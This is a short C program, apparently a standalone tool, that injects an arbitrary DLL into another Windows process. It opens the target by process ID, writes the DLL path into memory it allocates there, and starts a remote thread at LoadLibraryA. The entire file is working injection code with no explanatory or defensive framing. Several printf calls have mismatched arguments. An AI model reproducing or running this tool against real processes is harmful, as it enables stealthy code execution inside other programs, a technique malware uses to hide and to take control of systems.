#include <stdio.h>
#include <windows.h>

const char *k = "[+]";
const char *i = "[*]";
const char *e = "[-]";

DWORD PID = 0, TID = 0;

HANDLE hProcess = NULL, hThread = NULL;
char *lpPathInjectedDLL = NULL;
size_t lenPathInjectedDLL = 0;
LPVOID rBuffer = NULL;

int main(int argc, char **argv)
{
    if (argc < 3) {
        printf("%s usage: %s <PID> <Path Injected DLL>\n", e, argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    lpPathInjectedDLL = argv[2];
    lenPathInjectedDLL = strlen(argv[2]);

    printf("%s trying open process (%ld)\n", i, PID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (!hProcess) {
        printf("%s can't open process (%ld), error code: %ld\n", e, PID, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s process (%ld) opened successfully\n", k, PID);
    printf("%s trying allocate virtual memory for process (%ld)\n", i);

    rBuffer = VirtualAllocEx(hProcess, NULL, lenPathInjectedDLL, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!rBuffer) {
        printf("%s can't allocate virtual memory for process (%ld), error code: %ld\n", e, PID, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s virtual memory allocated successfully\n\\---0x%p\n", k, rBuffer);
    printf("%s trying write to allocated virtual memory\n", i);

    if (!WriteProcessMemory(hProcess, (LPVOID)rBuffer, lpPathInjectedDLL, lenPathInjectedDLL, NULL)) {
        printf("%s can't write to allocated virtual memory, error code: %ld\n", e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s writed to allocated virtual memory successfully\n", k);
    printf("%s trying create remote thread\n", i);

    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, rBuffer, 0, &TID);

    if (!hThread) {
        printf("%s can't create remote thread, error code: ", e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s created remote thread (%ld) successfully\n", k, TID);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s injecting ended, cleaning handles...\n", k);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return EXIT_SUCCESS;
}